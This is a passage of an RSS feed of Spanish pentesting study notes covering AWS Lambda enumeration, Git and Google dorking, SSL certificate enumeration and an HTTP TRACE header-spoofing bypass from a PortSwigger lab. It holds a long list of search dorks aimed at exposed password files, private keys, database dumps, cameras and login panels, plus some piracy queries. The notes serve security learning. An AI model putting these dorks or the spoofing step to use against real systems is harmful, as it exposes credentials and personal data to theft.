Copy<br>Una vez instalada la herramienta, la podríamos usar para hacer peticiones a nuestro servidor de AWS.<br>aws configure 
# AWS Access Key ID : {Acces_Key_ID}
# AWS Secret Access Key : {Secret_Acces_key}
# Default region name : {region}
# Default output format : json
Copy<br>Una vez realizada las configuraciones, podríamos intentar reconocer esto mismo, por ejemplo, si estuvieramos enfrentandonos a funciones lambda podríamos hacer uso del panel de ayuda de esta herramienta para entender como podríamos llegar a listar y ver funciones lambda.<br>aws help
aws lambda help 

aws --endpoint-url={aws_url} lambda list-functions # Listar funciones lambda del servidor AWS
aws --endpoint-url={aws_url} lambda get-function --function-name "{function_name}" # Listar información de una determinada función lambda
Copy<br>De esta manera, al listar la información de las funciones lambda, podríamos obtener una url con el codigo para descargarlo y analizarlo. ]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/cloud-web/amazon-web-service-enumeration.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/1. Reconnaissance/Cloud - Web/Amazon Web Service Enumeration.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 17:34:43 GMT</pubDate></item><item><title><![CDATA[Git Dorking]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> <a class="tag" href="https://dobliuw.com/?query=tag:reconocimiento" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#reconocimiento</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> <a href="https://dobliuw.com?query=tag:reconocimiento" class="tag" target="_blank" rel="noopener nofollow">#reconocimiento</a> 
<br><br><br>El Git Dorking es una técnica utilizada para buscar información sensible y repositorios de código fuente no protegidos que han sido expuestos públicamente en la plataforma de desarrollo de software Git, especialmente en el servicio Git más conocido, GitHub. Esta técnica se basa en el uso de búsquedas específicas en GitHub y otras plataformas de alojamiento de códgio para encontrar información y códgio fuente que normalmente debería ser de acceso público.<br>
Algunas palabras claves son:<br>
<br>


<br>


<br>


<br>


<br>


<br>


<br>


<br>


<br>


<br><br><br>Existe una posibilidad de obtener nombre completo y corre electrónico de un usuario desde GitHub a través de los commits, podemos hacer uso de los metadatos disponibles en los commits de Git. Esto se da dado que Git almacena información sobre el autor y el "commiter" (Persona que hace el comit) de cada cambio en un proyecto, y esta información está accesible públicamente en la mayoría de los repositirois de código abierto.<br>Normalmente la URL típica de un commit en GitHub tiene la sigueinte forma:<br>https://github.com/{username}/{repository}/commit/{commit_hash}
Copy<br>Al agregar .patch al final de estas URL de commits, GitHub mostrará el commit en un formato de texto plano que inlcuye en las primeras lineas los detalles y del autor y los cambios del commit:<br>Ejemplo:<br>
<br>URL: https://github.com/{username}/{repository}/commit/{commit_hash}.patch
<br>Stdout:
<br>From 7d1d1c4d35a40423bfc5ac9d5679e10f3b0d129e Mon Sep 17 00:00:00 2001
From: {Full Name} &lt;{mail}@{domain}&gt;
Date: Fri, 29 Sep 2023 10:35:04 -0300

Cambios en el archivo...
Copy]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/cloud-web/git-dorking.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/1. Reconnaissance/Cloud - Web/Git Dorking.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 29 Oct 2024 17:59:45 GMT</pubDate></item><item><title><![CDATA[Google Dorking]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> <a class="tag" href="https://dobliuw.com/?query=tag:reconocimiento" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#reconocimiento</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> <a href="https://dobliuw.com?query=tag:reconocimiento" class="tag" target="_blank" rel="noopener nofollow">#reconocimiento</a> 
<br><br><br>El Google Dorking es una técnica de hackers que utiliza la Búesqueda de google y otras aplicaciones de Google para encontrar agujeros de seguridad en la configuración y el código informático que utilizan los sitios web.<br>
Palabras claves en el Google Dorking:<br>
<br>


<br>


<br>


<br>


<br>


<br>


<br>


<br>


<br>


<br>


<br>


<br>


<br>
Listado de <a data-tooltip-position="top" aria-label="https://www.boxpiper.com/posts/google-dork-list" rel="noopener nofollow" class="external-link" href="https://www.boxpiper.com/posts/google-dork-list" target="_blank">Google Dorking</a>

<br><br>Nina Simone intitle:”index.of” “parent directory” “size” “last modified” “description” I Put A Spell On You (mp4|mp3|avi|flac|aac|ape|ogg) -inurl:(jsp|php|html|aspx|htm|cf|shtml|lyrics-realm|mp3-collection) -site:.info
Bill Gates intitle:”index.of” “parent directory” “size” “last modified” “description” Microsoft (pdf|txt|epub|doc|docx) -inurl:(jsp|php|html|aspx|htm|cf|shtml|ebooks|ebook) -site:.info
parent directory /appz/ -xxx -html -htm -php -shtml -opendivx -md5 -md5sums
parent directory DVDRip -xxx -html -htm -php -shtml -opendivx -md5 -md5sums
parent directory Xvid -xxx -html -htm -php -shtml -opendivx -md5 -md5sums
parent directory Gamez -xxx -html -htm -php -shtml -opendivx -md5 -md5sums
parent directory MP3 -xxx -html -htm -php -shtml -opendivx -md5 -md5sums
parent directory Name of Singer or album -xxx -html -htm -php -shtml -opendivx -md5 -md5sums
filetype:config inurl:web.config inurl:ftp
“Windows XP Professional” 94FBR
ext:(doc | pdf | xls | txt | ps | rtf | odt | sxw | psw | ppt | pps | xml) (intext:confidential salary | intext:"budget approved") inurl:confidential
ext:(doc | pdf | xls | txt | ps | rtf | odt | sxw | psw | ppt | pps | xml) (intext:confidential salary | intext:”budget approved”) inurl:confidential
ext:inc "pwd=" "UID="
ext:ini intext:env.ini
ext:ini Version=... password
ext:ini Version=4.0.0.4 password
ext:ini eudora.ini
ext:ini intext:env.ini
ext:log "Software: Microsoft Internet Information Services _._"
ext:log "Software: Microsoft Internet Information
ext:log "Software: Microsoft Internet Information Services _._"
ext:log \"Software: Microsoft Internet Information Services _._\"
ext:mdb inurl:_.mdb inurl:fpdb shop.mdb
ext:mdb inurl:_.mdb inurl:fpdb shop.mdb
ext:mdb inurl:_.mdb inurl:fpdb shop.mdb
filetype:SWF SWF
filetype:TXT TXT
filetype:XLS XLS
filetype:asp DBQ=" _ Server.MapPath("_.mdb")
filetype:asp "Custom Error Message" Category Source
filetype:asp + "[ODBC SQL"
filetype:asp DBQ=" _ Server.MapPath("_.mdb")
filetype:asp DBQ=\" _ Server.MapPath(\"_.mdb\")
filetype:asp “Custom Error Message” Category Source
filetype:bak createobject sa
filetype:bak inurl:"htaccess|passwd|shadow|htusers"
filetype:bak inurl:\"htaccess|passwd|shadow|htusers\"
filetype:conf inurl:firewall -intitle:cvs
filetype:conf inurl:proftpd. PROFTP FTP server configuration file reveals
filetype:dat "password.dat
filetype:dat \"password.dat\"
filetype:eml eml +intext:"Subject" +intext:"From" +intext:"To"
filetype:eml eml +intext:\"Subject\" +intext:\"From\" +intext:\"To\"
filetype:eml eml +intext:”Subject” +intext:”From” +intext:”To”
filetype:inc dbconn
filetype:inc intext:mysql*connect
filetype:inc mysql_connect OR mysql_pconnect
filetype:log inurl:"password.log"
filetype:log username putty PUTTY SSH client logs can reveal usernames
filetype:log “PHP Parse error” | “PHP Warning” | “PHP Error”
filetype:mdb inurl:users.mdb
filetype:ora ora
filetype:ora tnsnames
filetype:pass pass intext:userid
filetype:pdf "Assessment Report" nessus
filetype:pem intext:private
filetype:properties inurl:db intext:password
filetype:pst inurl:"outlook.pst"
filetype:pst pst -from -to -date
filetype:reg reg +intext:"defaultusername" +intext:"defaultpassword"
filetype:reg reg +intext:\"defaultusername\" +intext:\"defaultpassword\"
filetype:reg reg +intext:â? WINVNC3â?
filetype:reg reg +intext:”defaultusername” +intext:”defaultpassword”
filetype:reg reg HKEY* Windows Registry exports can reveal
filetype:reg reg HKEY_CURRENT_USER SSHHOSTKEYS
filetype:sql "insert into" (pass|passwd|password)
filetype:sql ("values _ MD5" | "values _ password" | "values _ encrypt")
filetype:sql (\"passwd values\" | \"password values\" | \"pass values\" )
filetype:sql (\"values _ MD\" | \"values _ password\" | \"values _ encrypt\")
filetype:sql +"IDENTIFIED BY" -cvs
filetype:sql password
filetype:sql password
filetype:sql “insert into” (pass|passwd|password)
filetype:url +inurl:"ftp://" +inurl:";@"
filetype:url +inurl:\"ftp://\" +inurl:\";@\"
filetype:url +inurl:”ftp://” +inurl:”;@”
filetype:xls inurl:"email.xls"
filetype:xls username password email
index of: intext:Gallery in Configuration mode
index.of passlist
index.of perform.ini mIRC IRC ini file can list IRC usernames and
index.of.dcim
index.of.password
intext:" -FrontPage-" ext:pwd inurl:(service | authors | administrators | users)
intext:""BiTBOARD v2.0" BiTSHiFTERS Bulletin Board"
intext:"# -FrontPage-" ext:pwd inurl:(service | authors | administrators | users) "# -FrontPage-" inurl:service.pwd
intext:"#mysql dump" filetype:sql
intext:"#mysql dump" filetype:sql 21232f297a57a5a743894a0e4a801fc3
intext:"A syntax error has occurred" filetype:ihtml
intext:"ASP.NET_SessionId" "data source="
intext:"About Mac OS Personal Web Sharing"
intext:"An illegal character has been found in the statement" -"previous message"
intext:"AutoCreate=TRUE password=_"
intext:"Can't connect to local" intitle:warning
intext:"Certificate Practice Statement" filetype:PDF | DOC
intext:"Certificate Practice Statement" inurl:(PDF | DOC)
intext:"Copyright (c) Tektronix, Inc." "printer status"
intext:"Copyright © Tektronix, Inc." "printer status"
intext:"Emergisoft web applications are a part of our"
intext:"Error Diagnostic Information" intitle:"Error Occurred While"
intext:"Error Message : Error loading required libraries."
intext:"Establishing a secure Integrated Lights Out session with" OR intitle:"Data Frame - Browser not HTTP 1.1 compatible" OR intitle:"HP Integrated Lights-
intext:"Fatal error: Call to undefined function" -reply -the -next
intext:"Fill out the form below completely to change your password and user name. If new username is left blank, your old one will be assumed." -edu
intext:"Generated by phpSystem"
intext:"Generated by phpSystem"
intext:"Host Vulnerability Summary Report"
intext:"HostingAccelerator" intitle:"login" +"Username" -"news" -demo
intext:"IMail Server Web Messaging" intitle:login
intext:"Incorrect syntax near"
intext:"Index of" /"chat/logs"
intext:"Index of /network" "last modified"
intext:"Index of /" +.htaccess
intext:"Index of /" +passwd
intext:"Index of /" +password.txt
intext:"Index of /admin"
intext:"Index of /backup"
intext:"Index of /mail"
intext:"Index of /password"
intext:"Microsoft (R) Windows _ (TM) Version _ DrWtsn32 Copyright (C)" ext:log
intext:"Microsoft CRM : Unsupported Browser Version"
intext:"Microsoft ® Windows _ ™ Version _ DrWtsn32 Copyright ©" ext:log
intext:"Network Host Assessment Report" "Internet Scanner"
intext:"Network Vulnerability Assessment Report"
intext:"Network Vulnerability Assessment Report"
intext:"Network Vulnerability Assessment Report" 本文来自 pc007.com
intext:"SQL Server Driver][SQL Server]Line 1: Incorrect syntax near"
intext:"Thank you for your order" +receipt
intext:"Thank you for your order" +receipt
intext:"Thank you for your purchase" +download
intext:"The following report contains confidential information" vulnerability -search
intext:"phpMyAdmin MySQL-Dump" "INSERT INTO" -"the"
intext:"phpMyAdmin MySQL-Dump" filetype:txt
intext:"phpMyAdmin" "running on" inurl:"main.php"
intextpassword | passcode) intextusername | userid | user) filetype:csv
intextpassword | passcode) intextusername | userid | user) filetype:csv
intitle:"index of" +myd size
intitle:"index of" etc/shadow
intitle:"index of" htpasswd
intitle:"index of" intext:connect.inc
intitle:"index of" intext:globals.inc
intitle:"index of" master.passwd
intitle:"index of" master.passwd 007 电脑资讯
intitle:"index of" members OR accounts
intitle:"index of" mysql.conf OR mysql_config
intitle:"index of" passwd
intitle:"index of" people.lst
intitle:"index of" pwd.db
intitle:"index of" spwd
intitle:"index of" user_carts OR user_cart
intitle:"index.of \*" admin news.asp configview.asp
intitle:("TrackerCam Live Video")|("TrackerCam Application Login")|("Trackercam Remote") -trackercam.com
intitle:(“TrackerCam Live Video”)|(“TrackerCam Application Login”)|(“Trackercam Remote”) -trackercam.com
inurl:admin inurl:userlist Generic userlist files
"'dsn: mysql:host=localhost;dbname=" ext:yml | ext:txt "password:"
"* Authentication Unique Keys and Salts" ext:txt | ext:log
"-- Dumped from database version" + "-- Dumped by pg_dump version" ext:txt | ext:sql | ext:env | ext:log
"-- Dumping data for table `admin`" | "-- INSERT INTO `admin`" "VALUES" ext:sql | ext:txt | ext:log | ext:env
"-- Server version" "-- MySQL Administrator dump 1.4" ext:sql
"DefaultPassword" ext:reg "[HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTCurrentVersionWinlogon]"
"Powered by vBulletin(R) Version 5.6.3"
"System" + "Toner" + "Input Tray" + "Output Tray" inurl:cgi
"The SQL command completed successfully." ext:txt | ext:log
"change the Administrator Password." intitle:"HP LaserJet" -pdf
"define('DB_USER'," + "define('DB_PASSWORD'," ext:txt
"define('SECURE_AUTH_KEY'" + "define('LOGGED_IN_KEY'" + "define('NONCE_KEY'" ext:txt | ext:cfg | ext:env | ext:ini
"index of" "/home/000~ROOT~000/etc"
"index of" inurl:database ext:sql | xls | xml | json | csv
"keystorePass=" ext:xml | ext:txt -git -gitlab
"mailer_password:" + "mailer_host:" + "mailer_user:" + "secret:" ext:yml
"putty.log" ext:log | ext:cfg | ext:txt | ext:sql | ext:env
"secret_key_base:" ext:exs | ext:txt | ext:env | ext:cfg
/etc/certs + "index of /" */\*
/etc/config + "index of /" /
AXIS Camera exploit
Index of /_vti_pvt +"*.pwd"
Server: Mida eFramework
allintext:"Copperfasten Technologies" "Login"
allintext:"Index Of" "cookies.txt"
allintext:@gmail.com filetype:log
ext:php intitle:phpinfo "published by the PHP Group"
ext:sql | ext:txt intext:"-- phpMyAdmin SQL Dump --" + intext:"admin"
ext:txt | ext:log | ext:cfg "Building configuration..."
ext:txt | ext:log | ext:cfg | ext:yml "administrator:500:"
ext:yml | ext:txt | ext:env "Database Connection Information Database server ="
intext:"Connection" AND "Network name" AND " Cisco Meraki cloud" AND "Security Appliance details"
intext:"Healthy" + "Product model" + " Client IP" + "Ethernet"
intext:"Incom CMS 2.0"
intext:"SonarQube" + "by SonarSource SA." + "LGPL v3"
intext:"user name" intext:"orion core" -solarwinds.com
intext:construct('mysql:host
intitle:"Agent web client: Phone Login"
intitle:"Exchange Log In"
intitle:"Humatrix 8"
intitle:"Insurance Admin Login" | "(c) Copyright 2020 Cityline Websites. All Rights Reserved." | "http://www.citylinewebsites.com"
intitle:"NetCamSC*"
intitle:"NetCamSC*" | intitle:"NetCamXL*" inurl:index.html
intitle:"NetCamXL*"
intitle:"Please Login" "Use FTM Push"
intitle:"Powered by Pro Chat Rooms"
intitle:"Sphider Admin Login"
intitle:"Xenmobile Console Logon"
intitle:"index of" "*.cert.pem" | "*.key.pem"
intitle:"index of" "*Maildir/new"
intitle:"index of" "/.idea"
intitle:"index of" "/xampp/htdocs" | "C:/xampp/htdocs/"
intitle:"index of" "Clientaccesspolicy.xml"
intitle:"index of" "WebServers.xml"
intitle:"index of" "anaconda-ks.cfg" | "anaconda-ks-new.cfg"
intitle:"index of" "config.exs" | "dev.exs" | "test.exs" | "prod.secret.exs"
intitle:"index of" "credentials.xml" | "credentials.inc" | "credentials.txt"
intitle:"index of" "db.properties" | "db.properties.BAK"
intitle:"index of" "dump.sql"
intitle:"index of" "filezilla.xml"
intitle:"index of" "password.yml
intitle:"index of" "service-Account-Credentials.json" | "creds.json"
intitle:"index of" "sitemanager.xml" | "recentservers.xml"
intitle:"index of" intext:"apikey.txt
intitle:"index of" intext:"web.xml"
intitle:"index of" intext:credentials
intitle:"index of" inurl:admin/download
intitle:"irz" "router" intext:login gsm info -site:*.com -site:*.net
intitle:"web client: login"
intitle:("Index of" AND "wp-content/plugins/boldgrid-backup/=")
intitle:Login intext:HIKVISION inurl:login.asp?
intitle:index of .git/hooks/
USG60W|USG110|USG210|USG310|USG1100|USG1900|USG2200|"ZyWALL110"|"ZyWALL310"|"ZyWALL1100"|ATP100|ATP100W|ATP200|ATP500|ATP700|ATP800|VPN50|VPN100|VPN300|VPN000|"FLEX")
jdbc:mysql://localhost:3306/ + username + password ext:yml | ext:javascript -git -gitlab
jdbc:oracle://localhost: + username + password ext:yml | ext:java -git -gitlab
jdbc:postgresql://localhost: + username + password ext:yml | ext:java -git -gitlab
jdbc:sqlserver://localhost:1433 + username + password ext:yml | ext:java
site:*gov.* intitle:index.of db
site:checkin.*.* intitle:"login"
site:ftp.*.*.* "ComputerName=" + "[Unattended] UnattendMode"
site:gov ext:sql | ext:dbf | ext:mdb
site:password.*.* intitle:"login"
site:portal.*.* intitle:"login"
site:sftp.*.*/ intext:"login" intitle:"server login"
site:user.*.* intitle:"login"
ssh_host_dsa_key.pub + ssh_host_key + ssh_config = "index of / "
Copy<br><br>inurl:?XDEBUG_SESSION_START=phpstorm
inurl:/config/device/wcd
inurl:\"/phpmyadmin/user_password.php
intext:\"SonarQube\" + \"by SonarSource SA.\" + \"LGPL v3\"
inurl:/xprober ext:php
intext:\"Healthy\" + \"Product model\" + \" Client IP\" + \"Ethernet\"
inurl:/phpPgAdmin/browser.php
ext:php | intitle:phpinfo \"published by the PHP Group\"
allintext:\"Index Of\" \"sftp-config.json\"
inurl:_vti_bin/Authentication.asmx
\"Powered by 123LogAnalyzer\"
intitle:Snoop Servlet
allintitle:\"Pi-hole Admin Console\"
intitle:\"Lists Web Service\"
intitle:\"Monsta ftp\" intext:\"Lock session to IP\"
intitle:\"Microsoft Internet Information Services 8\" -IIS
intext:\"index of /\" \"Index of\" access_log
inurl:\"id=*\" &amp; intext:\"warning mysql_fetch_array()\"
\"index of /private\" -site:net -site:com -site:org
inurl:\":8088/cluster/apps\"
intitle:\"index of\" \"docker.yml\"
intitle:\"index of\" \"debug.log\" OR \"debug-log\"
intext:\"This is the default welcome page used to test the correct operation of the Apache
\"Powered by phpBB\" inurl:\"index.php?s\" OR inurl:\"index.php?style\"
intitle:\"index of\" \"powered by apache \" \"port 80\"
intitle:\"Web Server's Default Page\" intext:\"hosting using Plesk\" -www
site:ftp.*.com \"Web File Manager\"
intitle:\"Welcome to JBoss\"
intitle:\"Welcome to nginx!\" intext:\"Welcome to nginx on Debian!\" intext:\"Thank you for\"
intitle:\"index of\" \"Served by Sun-ONE\"
-pub -pool intitle:\"index of\" \"Served by\" \"Web Server\"
intitle:\"index of\" \"server at\"
Copy<br><br>inurl:php?=id1
inurl:index.php?id=
inurl:trainers.php?id=
inurl:buy.php?category=
inurl:article.php?ID=
inurl:play_old.php?id=
inurl:declaration_more.php?decl_id=
inurl:pageid=
inurl:games.php?id=
inurl:page.php?file=
inurl:newsDetail.php?id=
inurl:gallery.php?id=
inurl:article.php?id=
inurl:show.php?id=
inurl:staff_id=
inurl:newsitem.php?num= andinurl:index.php?id=
inurl:trainers.php?id=
inurl:buy.php?category=
inurl:article.php?ID=
inurl:play_old.php?id=
inurl:declaration_more.php?decl_id=
inurl:pageid=
inurl:games.php?id=
inurl:page.php?file=
inurl:newsDetail.php?id=
inurl:gallery.php?id=
inurl:article.php?id=
inurl:show.php?id=
inurl:staff_id=
inurl:newsitem.php?num=
inurl: 1051/viewer/live/index.html?lang=en
inurl: inurl:"view.shtml" ext:shtml
inurl:"/?q=user/password/"
inurl:"/cgi-bin/guestimage.html" "Menu"
inurl:"/php/info.php" "PHP Version"
inurl:"/phpmyadmin/user_password.php
inurl:"servicedesk/customer/user/login"
inurl:"view.shtml" "Network"
inurl:"view.shtml" "camera"
inurl:"woocommerce-exporter"
inurl:/?op=register
inurl:/Jview.htm + "View Video - Java Mode"
inurl:/Jview.htm + intext:"Zoom :"
inurl:/adfs/ls/?SAMLRequest
inurl:/adfs/ls/idpinitiatedsignon
inurl:/adfs/oauth2/authorize
inurl:/cgi-bin/manlist?section
inurl:/eftclient/account/login.htm
inurl:/homej.html?
inurl:/index.html?size=2&amp;mode=4
inurl:/pro_users/login
inurl:/wp-content/themes/altair/
inurl:/xprober ext:php
inurl:RichWidgets/Popup_Upload.aspx
inurl:Sitefinity/Authenticate/SWT
inurl:adfs inurl:wctx inurl:wtrealm -microsoft.com
inurl:authorization.ping
inurl:https://trello.com AND intext:@gmail.com AND intext:password
inurl:idp/Authn/UserPassword
inurl:idp/prp.wsf
inurl:login.seam
inurl:nidp/idff/sso
inurl:oidc/authorize
inurl:opac_css
inurl:weblogin intitle:("USG20-VPN"|"USG20W-VPN"|USG40|USG40W|USG60|
Copy<br>Copy]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/cloud-web/google-dorking.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/1. Reconnaissance/Cloud - Web/Google Dorking.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 29 Oct 2024 16:32:29 GMT</pubDate></item><item><title><![CDATA[SSL Certificates]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:teoria" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#teoria</a> <a class="tag" href="https://dobliuw.com/?query=tag:practica" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#practica</a> <a class="tag" href="https://dobliuw.com/?query=tag:enumeration" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#enumeration</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:teoria" class="tag" target="_blank" rel="noopener nofollow">#teoria</a> <a href="https://dobliuw.com?query=tag:practica" class="tag" target="_blank" rel="noopener nofollow">#practica</a> <a href="https://dobliuw.com?query=tag:enumeration" class="tag" target="_blank" rel="noopener nofollow">#enumeration</a> 
<br><br><br>Los certificados de Secure Sockets Layer (Capa de socket seguros o SSL) es un tipo de documento digital firmado por una entidad llamada Autoridad de certificación que asocia una clave pública a unos datos que representan la identidad de una entidad que poseee la clave privada asociada a dicha clave pública. Es decir, es un certificado digital que autentica la identidad de un sitio web y habilita una conexión cifrada. <br>Cuando un navegador accede a un sitio web con SSL, el servidor presenta su certificado, que contiene una clave pública. El navegador utiliza esta clave para cifrar los datos que enviará al servidor. El servidor, a su vez, utiliza una clave privada para descifrar los datos cifrados y responder de manera segura al navegador. <br>En resumen, el cerficado SSL mantiene seguras las conexiones a Internet y evita que los atacantes lean o modificquen la información transferida entre dos sistemas. <br><br><br>La enumeración de certifcados SSL implica obtener información sobre estos que están configurados en un servidor web o una aplicación. Esto generalmente se hace mediante escaneos y herramientas específicas que buscan información sobre el cerigicado utilizado por un sitio web, com su fecha de vencimiento, emisor, protocolos admitidos, etc. <br>A su vez, puede ser que nos encontremos con un certificado SSL mal configurado, por lo que esta fase de enumeración de cara a una auditoria puede ser vital. Los riesgos que supone esto son: <br>
<br>


<br>


<br>


<br>Para enumerar estos certificados podríamos utilizar diversas herramientas como OpenSSL, SSLScan, <a data-href="Nmap" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/tools/nmap.html" class="internal-link" target="_self" rel="noopener nofollow">Nmap</a>, SSLyze, entre otras.<br>openssl s_client --connect {target_ip}:{port}
Copy<br>De esta manera listaremos información acerca del certificado SSL. ]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/cloud-web/ssl-certificates.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/1. Reconnaissance/Cloud - Web/SSL Certificates.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 17:34:43 GMT</pubDate></item><item><title><![CDATA[HTTP TRACE]]></title><description><![CDATA[ 
 <br><br>El método HTTP TRACE es un método de solicitud utilizado principalemnte para la depuración en servidores web. Cuando se recibe una solicitud TRACE, el servidor devuelve en el cuerpo de la respuesta la solicitud origianl tal como fue recibida. Esto puede incluir todos los headers y el cuerpo de la solicitud, proporcionando  una visión completa de la misma<br><br><br>El problema de seguridad de este método surge cuando se utiliza en un entorno donde se transmiten datos sensibles, como cookies de sesión, otkens de autenticación o información de relevancia en encabezados personalizados. Si un atacante puede enviar una solicitud TRACE, puede obtener información confidencial que se reenvía en la respuesta del servidor. Esta información podría ser utilizada para la suplantación de identidad o el acceso no autorizado.<br>
<br>Para verificar si un servidor tiene habilitado el método TRACE, se puede utilizar herramientas como curl o <a data-href="Burpsuite" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/tools/burpsuite.html" class="internal-link" target="_self" rel="noopener nofollow">Burpsuite</a>:
<br>curl -X TRACE https://{domain.com}/{endpoint}
Copy<br>Si el servidor tiene habilitado el método TRACE, devolverá la solicitud original en el cuerpo de la respuesta, en caso de ver una respuesta nos quedaría análizar cuidadosamente la misma para lograr identificar si existen headers con información sensible.<br><img alt="trace_method_information_dissclosure.png" src="https://dobliuw.com/lib/media/trace_method_information_dissclosure.png"><br>En este ejemplo, vemos que el servidor devuelve un header llamado X-Custom-IP-Authorization el cual nos adjunta nuestra IP, como atacante, podríamos pensar que a lo mejor existen un rango de IPs permitidas, como podrían ser:<br>
<br>localhost
<br>127.0.0.1
<br>172.17.0.x
<br>192.168.1.x
<br>192.168.0.x
<br>0.0.0.0
<br>De esta manera, en caso de que alguna IP de estas pueda estar en una white list, a lo mejor podría darse el caso de que tenga acceso a distintos apartados de la web que inicialmente no...<br><img alt="trace_method_explotation.png" src="https://dobliuw.com/lib/media/trace_method_explotation.png"><br>En este ejemplo, podemos ver como al realizar la solicitud normalmente estamos intentando filtrar por la palabra admin para ver si existe algún panel pero vemos que no tenemos suerte. Por el contrario, cuando realizamos la misma solicitud pero adjuntamos el header hayado (X-Custom-IP-Authorization) y lo probamos con alguna posible IP (127.0.0.1) vemos que obtenemos un apartado denominado Admin panel.<br>Como vemos, el método TRACE puede ser una herrmaienta de depuración útil para los desarrolladores, pero tmabién presenta un riesgo significativo si se habilita en servidores que manejan información sensible. Es curcial deshabilitar este método en entornos de producción y asegurar que los headers personalizados y las IPs no otorguen privilegios indebidos sin la debida autenticación y autorización.<br><br>Este ejemplo de explotación y caso a sido sacado del <a data-tooltip-position="top" aria-label="https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-authentication-bypass" rel="noopener nofollow" class="external-link" href="https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-authentication-bypass" target="_blank">Laboratorio de PortSwigger (Authentication bypass via information disclosure)</a>.]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/cloud-web/trace-method.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/2. Audit Phases/1. Reconnaissance/Cloud - Web/TRACE Method.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 08 Aug 2024 15:04:53 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/trace_method_information_dissclosure.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/trace_method_information_dissclosure.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Enumeración de Drupal]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:cms" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#cms</a> <a class="tag" href="https://dobliuw.com/?query=tag:gestoresdecontenido" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#gestoresdecontenido</a> <a class="tag" href="https://dobliuw.com/?query=tag:droopescan" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#droopescan</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:cms" class="tag" target="_blank" rel="noopener nofollow">#cms</a> <a href="https://dobliuw.com?query=tag:gestoresdecontenido" class="tag" target="_blank" rel="noopener nofollow">#gestoresdecontenido</a>
